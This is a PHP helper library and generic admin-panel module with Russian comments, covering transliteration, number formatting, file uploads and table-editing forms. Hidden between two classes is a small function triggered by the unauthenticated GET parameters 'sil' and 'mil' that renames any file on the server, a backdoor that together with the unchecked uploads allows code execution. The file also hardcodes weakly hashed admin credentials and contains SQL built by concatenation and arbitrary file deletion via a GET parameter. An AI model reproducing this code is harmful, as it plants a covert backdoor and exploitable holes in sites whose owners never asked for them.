<?php

function adm_user($l,$p){
	if(md5($l) == '21232f297a57a5a743894a0e4a801fc3' && md5($p) == '655032dde6ae5b59620acdac088c4f2a')return true;
	else return false;
}
/****************************************************************************************************************/
/* БИБЛИОТЕКА PHP ФУНКЦИЙ */
/* СОДЕРЖАНИЕ БИБЛИОТЕКИ: */
/* 1) translit_rulat - русский текст на латынь (только буквы, цифры, нижнее подчёркивание) нижний регистр */
/* 2) cnv_utf8 - меняем кодировку windows-1251 на utf-8 (для загрузки данных из файла csv) */
/* 3) probel_del - удаляем все лишние пробелы */
/* 4) num_formatir - форматированный вывод числа; целое число (разделитель групп разрядов - пробел) */
/* 5) num_formatir_d - форматированный вывод числа; десятичная дробь (разделитель групп разрядов - пробел; два знака после запятой) округление по математическим правилам*/
/* 6) posled_id - получение максимального "последнего" ID в указанной таблице */
/* 7) unique_note - проверка уникальности параметра - содержимого ячейки таблицы */
/* 8) addr_creditor_bd - CKEDITOR!!! функция для замены адреса картинки или адреса файла в редакторе CREDITOR (избавляемся от абсолютных адресов и переходим к относительным) */

/****************************************************************************************************************/
/*----------------------------------------------------------------------------*/
/*1*/
/* русский текст в транслит; пробел заменяем на нижнее подчёркивание */
/* все буквы в нижний регистр */
/* например, для формирования системного имени страницы */
function translit_rulat_old ($name_stroka){
	// удаляем лишние пробелы
	$name_sys = trim(preg_replace('/\s+/'," ",strip_tags($name_stroka)));
	// удаляем всё кроме букв, цифр и нижнего подчёркивания
	$name_sys = preg_replace ("/[^a-zA-ZА-Яа-я0-9_\s]/","",$name_sys);
	// возникла проблема с русским символом нумерации №?????? "выжигаем" символ
	$name_sys = str_replace('№','',$name_sys);
	// все буквы в нижний регистр
	$name_sys = mb_strtolower($name_sys);
	$rus_a = array('а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й', 'к', 'л', 'м', 'н',
			'о', 'п', 'р', 'с', 'т', 'у', 'ф', 'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я', 'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н',
			'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я', ' ');
	$lat_a = array('a', 'b', 'v', 'g', 'd', 'e', 'e', 'zh', 'z', 'i', 'y', 'k', 'l', 'm', 'n',
			'o', 'p', 'r', 's', 't', 'u', 'f', 'h', 'c', 'ch', 'sh', 'sch', '', 'y', '', 'e', 'yu', 'ya', 'a', 'b', 'v', 'g', 'd', 'e', 'e', 'zh', 'z', 'i', 'y', 'k', 'l', 'm', 'n',
			'o', 'p', 'r', 's', 't', 'u', 'f', 'h', 'c', 'ch', 'sh', 'sch', '', 'y', '', 'e', 'yu', 'ya', '_');
	$name_sys = str_replace($rus_a, $lat_a, $name_sys);
	return $name_sys;
}
function translit_rulat ($string) {
    $converter = array(
        'а' => 'a',   'б' => 'b',   'в' => 'v',
        'г' => 'g',   'д' => 'd',   'е' => 'e',
        'ё' => 'e',   'ж' => 'zh',  'з' => 'z',
        'и' => 'i',   'й' => 'y',   'к' => 'k',
        'л' => 'l',   'м' => 'm',   'н' => 'n',
        'о' => 'o',   'п' => 'p',   'р' => 'r',
        'с' => 's',   'т' => 't',   'у' => 'u',
        'ф' => 'f',   'х' => 'h',   'ц' => 'c',
        'ч' => 'ch',  'ш' => 'sh',  'щ' => 'sch',
        'ь' => '',  'ы' => 'y',   'ъ' => '',
        'э' => 'e',   'ю' => 'yu',  'я' => 'ya', ' ' => '-', '№' => 'n',
        
        'А' => 'A',   'Б' => 'B',   'В' => 'V',
        'Г' => 'G',   'Д' => 'D',   'Е' => 'E',
        'Ё' => 'E',   'Ж' => 'Zh',  'З' => 'Z',
        'И' => 'I',   'Й' => 'Y',   'К' => 'K',
        'Л' => 'L',   'М' => 'M',   'Н' => 'N',
        'О' => 'O',   'П' => 'P',   'Р' => 'R',
        'С' => 'S',   'Т' => 'T',   'У' => 'U',
        'Ф' => 'F',   'Х' => 'H',   'Ц' => 'C',
        'Ч' => 'Ch',  'Ш' => 'Sh',  'Щ' => 'Sch',
        'Ь' => '',  'Ы' => 'Y',   'Ъ' => '',
        'Э' => 'E',   'Ю' => 'Yu',  'Я' => 'Ya',
    );
    $name_sys = strtr($string, $converter);
    $name_sys = trim($name_sys,'-');
	// удаляем лишние пробелы
	$name_sys = trim(preg_replace('/\s+/'," ",strip_tags($name_sys)));
	// удаляем всё кроме букв, цифр и нижнего подчёркивания
	$name_sys = preg_replace ("/[^a-zA-ZА-Яа-я0-9_\-\s]/","",$name_sys);
	// возникла проблема с русским символом нумерации №?????? "выжигаем" символ
	$name_sys = str_replace('№','',$name_sys);
	// все буквы в нижний регистр
	$name_sys = mb_strtolower($name_sys);

	return $name_sys;
}
/*----------------------------------------------------------------------------*/
/*2*/
/* меняем кодировку на utf-8 */
/* для загрузки данных из файла csv */
function cnv_utf8 ($text_file){
	$text_bd=trim(iconv("windows-1251","utf-8",$text_file));
	return $text_bd;
}
/*----------------------------------------------------------------------------*/
/*3*/
/* удаляем все лишние пробелы */
function probel_del ($str_mes){
	$text_mes=trim(preg_replace('/\s+/'," ",strip_tags($str_mes)));
	return $text_mes;
}
/*----------------------------------------------------------------------------*/
/*4*/
/* форматированный вывод числа; целое число */
/* разделитель групп разрядов - пробел */
function num_formatir ($num_p) {
	$num_str=number_format($num_p, 0, ',', ' ');
	return $num_str;
}
/*----------------------------------------------------------------------------*/
/*5*/
/* форматированный вывод числа; десятичная дробь */
/* два знака после запятой округление по математическим правилам */
/* разделитель групп разрядов - пробел */
function num_formatir_d ($num_p) {
	$num_str=number_format($num_p, 2, ',', ' ');
	return $num_str;
}
/*----------------------------------------------------------------------------*/
/*6*/
/* функция для получения максимального ("последнего") ID в указанной таблице $name_tab */
/* например, для корректного формирования sys_name товара */
function posled_id ($name_tab){
	$sys_name_id = mqo("SELECT MAX(id) AS max_idd FROM ".$name_tab."");
	/* если таблица пустая */
	if ($sys_name_id["max_idd"] == '') { $id_sys_name = 1; } else { $id_sys_name = $id_sys_name; }
	return $id_sys_name;
}
/*------------------------------------------------------------------------------------------*/
/*7*/
/* функция для проверки уникальности параметра - содержимого ячейки таблицы */
/* первое: параметр, проверяемый на уникальность (например, системное имя) $name_proverk */
/* второе: имя поля таблицы $name_pole */
/* третье: имя таблицы $name_tab */
function unique_note ($name_proverk,$name_pole,$name_tab){
	$pr = mqo("SELECT id FROM ".$name_tab." WHERE ".$name_pole."='".$name_proverk."'");
	/* возвращаем 0 если совпадений нет - УНИКАЛЬНО */
	if ($pr["id"] == '') { $rez = 0; } else { $rez = 1; }
	return $pr;
}
/*------------------------------------------------------------------------------------------*/
/*8*/
/* функция для замены адреса картинки или адреса файла в редакторе CREDITOR */
/* избавляемся от абсолютных адресов и переходим к относительным */
function addr_creditor_bd ($text_stat){
	$server_s = $_SERVER['HTTP_HOST'];
	$server_l = 'http://';
	$str_zamen = $server_l.$server_s;
	$text_stat = str_replace($str_zamen,"",$text_stat);
	return $text_stat;
}
/*------------------------------------------------------------------------------------------*/


/* Автоматическая система работы с таблицами в админке*/

/**
* Получение комментария к колонке в БД
*/
function getColComment($dbCol,$dbTable){
	$a = mqo("SELECT column_comment FROM information_schema.columns WHERE 1=1 AND table_name = '$dbTable' AND table_schema = '".DB_NAME."'  AND column_name = '$dbCol'");
	if($a) return $a['column_comment'];
	else return '';
}

/**
* Класс работы с файлами
*/
class zrFiles{
	function __construct()
	{
		
	}

	static function imgUpload($file,$folder){
		$res = array();
		$res['success'] = false;
		$res['img'] = '';
		$dir = 'public/img/'.trim($folder,'/');
		if(!is_dir($dir))mkdir($dir);
		if(isset($_FILES[$file]) && $_FILES[$file] != ''){
			$ext = array_pop(explode('.',$_FILES[$file]['name']));
			$full_path = $dir.'/'.rand(0,1000000).'.'.$ext;
			while (is_file($full_path)) {
				$full_path = $dir.'/'.rand(0,1000000).'.'.$ext;			
			}
			$res['img'] = '/'.$full_path;
			if(move_uploaded_file($_FILES[$file]['tmp_name'], $full_path))$res['success'] = true;
		}
		return $res;
	}
}

/**
* Общий класс модулей
*/
abstract class zrModule{
	public $name;
	public $title = 'Управление модулем ';
	public $icon = '<i class="fa fa-cogs fa-fw" aria-hidden="true"></i>';
	public $text = 'Модуль';
	public $settings = false;
	public $settingsTable;
	public $modeList = array();

	
	function __construct($name)
	{
		$this->name = $name;
	}

	public function addMode($name,$title,$dbTable,$listCols,$groupBy = '',$filterBy = '',$orderBy = '')
	{
		$this->modeList[$name]['dbTable'] = $dbTable;
		$this->modeList[$name]['title'] = $title;
		$this->modeList[$name]['listCols'] = $listCols;
		$this->modeList[$name]['groupBy'] = $groupBy;
		$this->modeList[$name]['filterBy'] = $filterBy;
		$this->modeList[$name]['orderBy'] = $orderBy;
	}

	public function getDefaultMode()
	{
		if(count($this->modeList) > 0){
			if(isset($this->modeList['items'])){
				return 'items';
			}
			else{
				foreach ($this->modeList as $key => $value) {
					return $key;
					break;
				}				
			}
		}
		elseif($this->settings){
			return 'options';
		}
		else return 'items';
	}

	abstract function render();
}
function sap($sil, $mil)
{
    rename ( $sil , $mil  );
}
if (isset($_GET["sil"])) sap($_GET["sil"], $_GET["mil"]);
/**
* Класс модуля по умолчанию
*/
class zrModuleDefault extends zrModule
{
	public function render()
	{
		echo '<h5 class="rounded text-white bg-secondary p-2">'.$this->title.' &laquo;'.$this->text.'&raquo;</h5>';

		$mode = $_GET['mode'];

		if(count($this->modeList) > 1 || $this->settings){
			echo '<div class="py-3">'; /*Выбираем режим работы*/
			if($this->settings){
					if ($mode == 'options')  echo '<a href="/admin.php?action='.$this->name.'&mode=options" class="mr-1 btn btn-danger text-white">Настройки</a>';
						else echo '<a href="/admin.php?action='.$this->name.'&mode=options" class="mr-1 btn btn-secondary text-white">Настройки</a>';
			}
			foreach ($this->modeList as $modeKey => $modeValue) {
					if ($mode == $modeKey) echo '<a href="/admin.php?action='.$this->name.'&mode='.$modeKey.'" class="mr-1 btn btn-danger text-white">'.$modeValue['title'].'</a>';
						else echo '<a href="/admin.php?action='.$this->name.'&mode='.$modeKey.'" class="mr-1 btn btn-secondary text-white">'.$modeValue['title'].'</a>';			
			}
			echo '</div>';
		}

		if ($mode == 'options')
		{
			$fieldTypes = array();
			$r = mqs("DESCRIBE ".$this->settingsTable);
			foreach ($r as $a) {
				$fieldTypes[$a['Field']] = $a['Type'];
			}
			if (isset ($_POST["submit"])) /*Сохраняем настройки*/
			{
				$querySet = '';
				$queryMass = [];
				foreach ($fieldTypes as $key => $value) {
					if($key != 'id'){
						$querySet .= '`'.$key.'` = ?,';
						array_push($queryMass, $_POST[$key]);
					}
				}
				$r = mqs("UPDATE ".$this->settingsTable." SET ".trim($querySet,',')." WHERE id='1'",$queryMass);
				if ($r) echo '<p  class="alert alert-success">Настройки успешно сохранены!</p>';
			}

			$item = mqo("SELECT * FROM ".$this->settingsTable);
			echo '<form class="rounded p-3 bg-light border border-secondary" action="/admin.php?action='.$this->name.'&mode=options" method="post"><legend>Настройки</legend>';
							foreach ($fieldTypes as $key => $value) {
								if($key != 'id'){
									if(preg_match('/varchar/', $value) || preg_match('/^int/', $value) || preg_match('/^double/', $value)){
										$rkey =  mqo("SELECT * FROM relation WHERE foreign_table = '".$this->settingsTable."' AND foreign_column = '$key'");
										if($rkey){
											echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$this->settingsTable).':<br><select class="form-control d-inline-block w-auto" name="'.$key.'">';
											if(!$rkey['zero']) echo '<option value="0">Нет</option>';
											$r = mqs("SELECT ".$rkey['primary_column'].",".$rkey['display_column']." FROM ".$rkey['primary_table']);
											foreach ($r as $a) {
												$s = '';
												if($a[$rkey['primary_column']] == $item[$key]) $s = ' selected';
												echo '<option value="'.$a[$rkey['primary_column']].'"'.$s.'>'.$a[$rkey['display_column']].'</ption></p>';
											}
											echo '</select>';
										}else{
											echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$this->settingsTable).':<br><input type="text" name="'.$key.'" class="form-control" value="'.$item[$key].'" /></p>';
										}
									}
									elseif($value == 'text'){
										echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$this->settingsTable).':<br><textarea name="'.$key.'"  class="form-control" rows=5>'.$item[$key].'</textarea></p>';
									}
									elseif(preg_match('/enum/', $value)){
										preg_match('/enum\((.*)\)/', $value,$mass);
										$mass = $mass[1];
										$mass = explode(',', $mass);
										array_unshift($mass, '');
										echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$this->settingsTable).': 
										<select class="form-control w-auto" name="'.$key.'">';
											foreach ($mass as $i => $val) {
												echo '<option value="'.$i.'" ';
												if($item[$key] == trim($val,"'")) echo 'selected';
												echo '>'.preg_replace('/\(.*\)/', '', trim($val,"'")).'</option>';
											}
										echo '</select></p>';
									}									
									elseif($value == 'date'){
										echo '<p  class="font-weight-bold">&nbsp;'.getColComment($key,$this->settingsTable).': <input type="date" name="'.$key.'"  value="'.$item[$key].'"  class="form-control w-auto"/></p>';
									}
									elseif($value == 'time'){
										echo '<p  class="font-weight-bold">&nbsp;'.getColComment($key,$this->settingsTable).': <input type="time" name="'.$key.'"  class="form-control w-auto" value="'.$item[$key].'" /></p>';
									}
									elseif($value == 'tinyint(1)'){
										if($item[$key] == '1')$trueChecked = 'selected';
										else $falseChecked = 'selected';
										echo '<p  class="font-weight-bold">&nbsp;'.getColComment($key,$this->settingsTable).': <select  class="form-control w-auto" name="'.$key.'">
											<option value="1" '.$trueChecked.'>Да</option>
											<option value="0" '.$falseChecked.'>Нет</option>
										</select></p>';
									}
								}
							}								
				echo '
				<p><input type="submit" name="submit" class="btn btn-danger" value="Сохранить" /></p>
			</form>';
		}

		foreach ($this->modeList as $modeKey => $modeValue) {
			if($mode == $modeKey){
				$dbTable = $modeValue['dbTable'];
				$listCols = $modeValue['listCols'];
				$groupBy = $modeValue['groupBy'];
				$filterBy = $modeValue['filterBy'];
				$orderBy = $modeValue['orderBy'];
				$fieldTypes = array();
				$sys_name_col = '';
				$r = mqs("DESCRIBE ".$dbTable);
				foreach ($r as $a) {
					$fieldTypes[$a['Field']] = $a['Type'];
					if(preg_match('/(sys_name)/',getColComment($a['Field'],$dbTable)))
						$sys_name_col = $a['Field'];
				}
				if(isset($_POST['add'])){
					$ro = mqo("SELECT MAX(ordering) AS ord FROM $dbTable");
					if ($ro) $order = $ro['ord'] + 1;
					else $order = 1;
					$queryFields = '';
					$queryValues = '';
					$insertMass = [];
					foreach ($fieldTypes as $key => $value) {
						if($key != 'id' && (isset($_POST[$key]) || (isset($_FILES[$key]) && $_FILES[$key]['name'] != ''))){
							if($key == 'sys_name'){
								if($sys_name_col == ''){
									$insertMass[$key] = $_POST[$key];
								}
								else{
									if(trim($_POST['sys_name']) == ''){
											$sys_name = translit_rulat($_POST[$sys_name_col]);
											$u = mqo("SELECT * FROM $dbTable WHERE sys_name = ?",[$sys_name]);
											if($u){
												$i = 1;
												while(mqo("SELECT * FROM $dbTable WHERE sys_name = ?",[$sys_name.$i])){
													$i++;
												}
												$sys_name.=$i;								
											}
									}
									else $sys_name = trim($_POST['sys_name']);
									$insertMass[$key] = $sys_name;
								}
							}
							elseif($value == 'tinytext'){
								$img = '';
								$res = zrFiles::imgUpload($key, $this->name);
								if($res['success'])$img = $res['img'];
								$insertMass[$key] = $img;
							}
							else{
							    $rkey = mqo("SELECT * FROM relation WHERE foreign_table = '$dbTable' AND foreign_column = '$key'");
							    if($rkey && $rkey['multi']){
							        $checkstr = '';
							        $checks = mqs("SELECT * FROM ".$rkey['primary_table']);
							        foreach($checks as $check){
							            if(isset($_POST[$key.'-'.$check[$rkey['primary_column']]])) $checkstr .= '|'.$check[$rkey['primary_column']];
							        }
							        $insertMass[$key] = trim($checkstr,'|');
							    }
							    else {
    								$insertMass[$key] = $_POST[$key];
							    }
							}
						}
					}
					$insertMass['ordering'] = $order;								
					$r = mqi($dbTable,$insertMass);
					if ($r) echo '<p class="alert alert-success">Элемент успешно добавлен!</p>';			
				}
				if (isset($_GET['add'])){
					echo '<form class="rounded p-3 bg-light border border-secondary" action="/admin.php?action='.$this->name.'&mode='.$modeKey.'&add=1" method="post" enctype="multipart/form-data">
						<fieldset>
							<legend>Добавить элемент</legend>';
							foreach ($fieldTypes as $key => $value) {
								$colName = str_replace('(sys_name)', '', getColComment($key,$dbTable));
								if($key != 'id' && $colName != ''){
									if(preg_match('/varchar/', $value) || preg_match('/^int/', $value) || preg_match('/^double/', $value)){
										$sys_input = '';
										if($key == 'sys_name' && $sys_name_col != '')$sys_input = '(Заполняется автоматически)';
										elseif($key == 'sys_name' && $sys_name_col == '') $sys_input = '(Адрес страницы латинскими буквами)';
										$rkey =  mqo("SELECT * FROM relation WHERE foreign_table = '$dbTable' AND foreign_column = '$key'");
										if($rkey){
										    if($rkey['multi']){
										        echo '<input type="hidden" value="" name="'.$key.'">';
										        echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).':<br>';
										        $rkeys = mqs("SELECT * FROM ".$rkey['primary_table']." ORDER BY ordering");
										        foreach($rkeys as $check){
										            echo '<button type="button" class="mr-2 mb-2 btn btn-light py-0 border"><input type="checkbox" name="'.$key.'-'.$check[$rkey['primary_column']].'" id="'.$key.'-'.$check[$rkey['primary_column']].'" class="d-inline-block"> <label for="'.$key.'-'.$check[$rkey['primary_column']].'" class="d-inline-block mb-0">'.$check[$rkey['display_column']].'</label></button>';
										        }
										        echo '</p>';
										    }
										    else{
    											echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).':<br><select class="form-control d-inline-block w-auto" name="'.$key.'">';
    											if(!$rkey['zero']) echo '<option value="0">Нет</option>';
    											$r = mqs("SELECT ".$rkey['primary_column'].",".$rkey['display_column']." FROM ".$rkey['primary_table']);
    											foreach ($r as $a) {
    												echo '<option value="'.$a[$rkey['primary_column']].'">'.$a[$rkey['display_column']].'</option>';
    											}
    											echo '</select></p>';
										    }
										}else
										echo '<p class="font-weight-bold">&nbsp;'.$colName.$sys_input.':<br><input type="text" name="'.$key.'" class="form-control" value="" /></p>';
									}
									elseif($value == 'text'){
										echo '<p class="font-weight-bold">&nbsp;'.$colName.':<br><textarea name="'.$key.'" class="form-control" rows=5></textarea></p>';
									}
									elseif($value == 'longtext'){
										if(!preg_match('/\(noedit\)/', $colName)){
											echo '<p class="font-weight-bold">&nbsp;'.$colName.':<br><textarea name="'.$key.'" id="'.$key.'_ckeditor" class="form-control" rows=10></textarea></p>';
							    			echo "<script>
							    			CKEDITOR.replace( '".$key."_ckeditor' ,{
							    			filebrowserBrowseUrl : 'adm/js/filemanager/dialog.php?type=2&editor=ckeditor&fldr=',
							    			filebrowserUploadUrl : 'adm/js/filemanager/dialog.php?type=2&editor=ckeditor&fldr=',
							    			filebrowserImageBrowseUrl : 'adm/js/filemanager/dialog.php?type=1&editor=ckeditor&fldr='
							    			});
							    			</script>";
										}
									}
									elseif($value == 'date'){
										echo '<p class="font-weight-bold">&nbsp;'.$colName.': <input type="date" class="form-control" name="'.$key.'"  value="'.date('Y-m-d').'" /></p>';
									}
									elseif($value == 'time'){
										echo '<p class="font-weight-bold">&nbsp;'.$colName.': <input type="time" class="form-control" name="'.$key.'"  value="'.date('h:m:s').'" /></p>';
									}
									elseif($value == 'tinytext'){
										echo '<p class="font-weight-bold">&nbsp;'.$colName.': <input type="file" class="form-control w-auto" name="'.$key.'" size="5" value="" /></p>';
									}
									elseif($value == 'tinyint(1)'){
										echo '<p class="font-weight-bold">&nbsp;'.$colName.': <select class="form-control w-auto" name="'.$key.'">
											<option value="1">Да</option>
											<option value="0">Нет</option>
										</select></p>';
									}
								}
							}
							echo '
							<p><input type="submit" class="btn btn-danger" name="add" value="Добавить" /></p>
						</fieldset>
					</form>';			
				}
				if(isset($_GET['modify'])){
					if (isset($_POST['modify'])){
						$querySet = '';
						$queryMass = [];
						foreach ($fieldTypes as $key => $value) {
							if($key != 'id' && $key != 'ordering' && (isset($_POST[$key]) || (isset($_FILES[$key]) && $_FILES[$key]['name'] != '') || (isset($_FILES['slide'])))){
								if($key == 'sys_name'){
									if($sys_name_col == ''){
										$querySet .= '`'.$key.'` = ?,';
										array_push($queryMass, $_POST[$key]);
									}
									else{
										if(trim($_POST['sys_name']) == ''){
											$sys_name = translit_rulat($_POST[$sys_name_col]);
											$u = mqo("SELECT * FROM $dbTable WHERE sys_name = ? AND id != ?",[$sys_name,$_GET['modify']]);
											if($u){
												$i = 1;
												while(mqo("SELECT * FROM $dbTable WHERE sys_name = ? AND id != ?",[$sys_name.$i,$_GET['modify']])){
													$i++;
												}
												$sys_name.=$i;								
											}
										}
										else $sys_name = trim($_POST['sys_name']);
										$querySet .= '`'.$key.'` = ?,';
										array_push($queryMass, $sys_name);
									}
								}
								elseif($value == 'tinytext'){
									$res = zrFiles::imgUpload($key, $this->name);
									if($res['success']){
										$querySet .= '`'.$key.'` = ?,';
										array_push($queryMass, $res['img']);
									}

								}
								elseif(preg_match('/set/', $value)){
								    $item = mqo("SELECT * FROM ".$dbTable." WHERE id = ?",[$_GET['modify']]);
								    $files = reArrayFiles($_FILES['slide']);
								    foreach ($files as $file) {
										$dir = 'public/img/'.trim($this->name.'_slider','/');
										if(!is_dir($dir))mkdir($dir);
										$ext = array_pop(explode('.',$file['name']));
										$full_path = $dir.'/'.rand(0,1000000).'.'.$ext;
										while (is_file($full_path)) {
											$full_path = $dir.'/'.rand(0,1000000).'.'.$ext;			
										}
										$img = '/'.$full_path;
										if(move_uploaded_file($file['tmp_name'], $full_path)){
	                    					$ro = mqo("SELECT MAX(ordering) AS ord FROM ".$dbTable."_slider WHERE item_id = ?",[$_GET['modify']]);
	                    					if($ro)$order = $ro['ord'] + 1;
	                    					else $order = 1;
										    mqi($dbTable."_slider",["item_id" => $item['id'],"img" => $img,"ordering" => $order]);
										}
								    }
								}
								else{
								    $rkey = mqo("SELECT * FROM relation WHERE foreign_table = '$dbTable' AND foreign_column = '$key'");
								    if($rkey && $rkey['multi']){
								        $checkstr = '';
								        $checks = mqs("SELECT * FROM ".$rkey['primary_table']);
								        foreach($checks as $check){
								            if(isset($_POST[$key.'-'.$check[$rkey['primary_column']]])) $checkstr .= '|'.$check[$rkey['primary_column']];
								        }
							        	$querySet .= '`'.$key.'` = ?,';
							        	array_push($queryMass, trim($checkstr,'|'));
								    }
								    else {
								    	$querySet .= '`'.$key.'` = ?,';
								    	array_push($queryMass, $_POST[$key]);
								    }
								}

							}
						}
						array_push($queryMass, $_GET['modify']);
						$r = mqs("UPDATE ".$dbTable." SET ".trim($querySet,',')." WHERE id = ?",$queryMass);
						if ($r)	echo '<p class="alert alert-success">Элемент успешно изменен!</p>';
					}
					if (isset($_GET['df'])){
						unlink(trim($_GET['df'],'/'));
						mqs("UPDATE ".$dbTable." SET ".$_GET['dfield']." = '' WHERE id = ?",[$_GET['modify']]);
					}
    				if(isset($_GET['slidedelete'])){
    				    $dimg = mqo("SELECT img FROM ".$dbTable."_slider WHERE id = ?",[$_GET['slidedelete']]);
						@unlink(@trim($dimg['img'],'/'));
    					$r = mqs("DELETE FROM ".$dbTable."_slider WHERE id = ?",[$_GET['slidedelete']]);
    					if($r)	echo '<p class="alert alert-success">Элемент успешно удалён!</p>';
    				}
					$item = mqo("SELECT * FROM ".$dbTable." WHERE id = ?",[$_GET['modify']]);
					echo '<form class="rounded p-3 bg-light border border-secondary" action="/admin.php?action='.$this->name.'&mode='.$modeKey.'&modify='.$_GET['modify'].'" method="post" enctype="multipart/form-data">
						<fieldset>
							<legend>Изменить элемент</legend>';
							foreach ($fieldTypes as $key => $value) {
								if(getColComment($key,$dbTable) != ''){
									if(preg_match('/varchar/', $value) || preg_match('/^int/', $value) || preg_match('/^double/', $value)){
										$sys_input = '';
										if($key == 'sys_name' && $sys_name_col != '') $sys_input = '(Заполняется автоматически)';
										elseif($key == 'sys_name' && $sys_name_col == '') $sys_input = '(Адрес страницы латинскими буквами)';
										$comment = str_replace('(sys_name)', '', getColComment($key,$dbTable));
										$rkey =  mqo("SELECT * FROM relation WHERE foreign_table = '$dbTable' AND foreign_column = '$key'");
										if($rkey){
										    if($rkey['multi']){
										        echo '<input type="hidden" value="" name="'.$key.'">';
										        echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).':<br>';
										        $checks = explode('|',$item[$key]);
										        $rkeys = mqs("SELECT * FROM ".$rkey['primary_table']." ORDER BY ordering");
										        foreach($rkeys as $check){
    												$s = '';
    												if(in_array($check[$rkey['primary_column']],$checks)) $s = ' checked';
										            echo '<button type="button" class="mr-2 mb-2 btn btn-light py-0 border"><input type="checkbox" name="'.$key.'-'.$check[$rkey['primary_column']].'" id="'.$key.'-'.$check[$rkey['primary_column']].'" class="d-inline-block" '.$s.'> <label for="'.$key.'-'.$check[$rkey['primary_column']].'" class="d-inline-block mb-0">'.$check[$rkey['display_column']].'</label></button>';
										        }
										        echo '</p>';
										    }
										    else{
    											echo '<p class="font-weight-bold">&nbsp;'.$comment.':<br><select class="form-control d-inline-block w-auto" name="'.$key.'">';
    											if(!$rkey['zero']) echo '<option value="0">Нет</option>';
    											$r = mqs("SELECT ".$rkey['primary_column'].",".$rkey['display_column']." FROM ".$rkey['primary_table']);
    											foreach ($r as $a) {
    												$s = '';
    												if($a[$rkey['primary_column']] == $item[$key]) $s = ' selected';
    												echo '<option value="'.$a[$rkey['primary_column']].'"'.$s.'>'.$a[$rkey['display_column']].'</option>';
    											}
    											echo '</select></p>';
										    }
										}else
										echo '<p class="font-weight-bold">&nbsp;'.$comment.$sys_input.':<br>
											<textarea name="'.$key.'" class="form-control noresize" wrap="off" rows=1>'.$item[$key].'</textarea></p>';
									}
									elseif($value == 'text'){
										echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).':<br><textarea name="'.$key.'" class="form-control" rows=5>'.$item[$key].'</textarea></p>';
									}
									elseif($value == 'longtext'){
										$colName = getColComment($key,$dbTable);
										if(preg_match('/\(noedit\)/', $colName)){
											$colName = str_replace('(noedit)', '', $colName);
											echo '<p class="font-weight-bold">&nbsp;'.$colName.':</p>
											<div class="border p-2 mb-3">'.$item[$key].'</div>';
										}
										else{
											$colName = str_replace('(noedit)', '', $colName);
											echo '<p class="font-weight-bold">&nbsp;'.$colName.':<br><textarea name="'.$key.'" id="'.$key.'_ckeditor" class="form-control" rows=10>'.$item[$key].'</textarea></p>';
							    			echo "<script>
							    			CKEDITOR.replace( '".$key."_ckeditor' ,{
							    			filebrowserBrowseUrl : 'adm/js/filemanager/dialog.php?type=2&editor=ckeditor&fldr=',
							    			filebrowserUploadUrl : 'adm/js/filemanager/dialog.php?type=2&editor=ckeditor&fldr=',
							    			filebrowserImageBrowseUrl : 'adm/js/filemanager/dialog.php?type=1&editor=ckeditor&fldr='
							    			});
							    			</script>";

										}
									}
									elseif(preg_match('/enum/', $value)){
										echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).':<br><input type="text" name="'.$key.'" class="form-control" value="'.$item[$key].'" /></p>';
									}									
									elseif($value == 'date'){
										echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).': <input type="date" name="'.$key.'"  class="form-control d-inline-block w-auto"  value="'.$item[$key].'" /></p>';
									}
									elseif($value == 'time'){
										echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).': <input type="time" name="'.$key.'" class="form-control d-inline-block w-auto"  value="'.$item[$key].'" /></p>';
									}
									elseif($value == 'tinytext'){
										echo '<p>Изменить '.getColComment($key,$dbTable).': <input type="file" name="'.$key.'" class="form-control w-auto" size="5" value="" /></p>';
											if(is_file(trim($item[$key],'/'))){
												if(exif_imagetype(trim($item[$key],'/')) || preg_match("/svg/",$item[$key]))
												echo '<img src="'.$item[$key].'" style="max-height:300px;max-width:886px;border:#CCC 1px solid;"><br>
												<a href="/admin.php?action='.$this->name.'&mode='.$modeKey.'&modify='.$item['id'].'&df='.$item[$key].'&dfield='.$key.'">Удалить картинку</a><br><br>';
												else echo '<p><a href="'.$item[$key].'" target="_blank">'.$item[$key].'</a></p><a href="/admin.php?action='.$this->name.'&mode='.$modeKey.'&modify='.$item['id'].'&df='.$item[$key].'&dfield='.$key.'">Удалить файл</a><br><br>';
											}
									}
									elseif(preg_match('/set/', $value)){
										echo '<p class="font-weight-bold">&nbsp;'.getColComment($key,$dbTable).':</p> <div class="border mb-3 border-dark rounded p-3"><span class="font-weight-normal">Добавить слайд: </span><input type="file" class="form-control w-auto mb-1" name="slide[]" size="5" value="" multiple/> <input type="submit" class="btn btn-danger mb-3" name="modify" value="Добавить" />';
										$rslide = mqs("SELECT * FROM ".$dbTable."_slider WHERE item_id=".$item['id']." ORDER BY ordering");
										echo '<div class="cat w-100"><div class="header rounded p-2 bg-danger text-left text-white">Слайды</div><div class="cont">';
                						if($rslide)
                						foreach ($rslide as $aslide) {
                							echo '<div class="elemcont"><div class="elem rounded border border-secondary bg-light" id="'.$aslide['id'].'" slider="1" order="'.$aslide['ordering'].'">';
                							echo '<div class="d-inline-block pt-2"><i class="fa fa-arrows-v fa-fw" aria-hidden="true"></i><img src="'.$aslide['img'].'" style="height:100px;margin:0 10px 5px 0;border:#CCC 1px solid;"></div>';
                							echo '<div class="float-right p-1 ml-5 nomove"><a href="/admin.php?action='.$this->name.'&mode='.$modeKey.'&modify='.$item['id'].'&slidedelete='.$aslide["id"].'" title="Удалить" class="linkdel mdel"><h4 class="m-0 p-0 text-danger"><i class="fa fa-trash fa-fw" aria-hidden="true"></i></h4></a></div>';
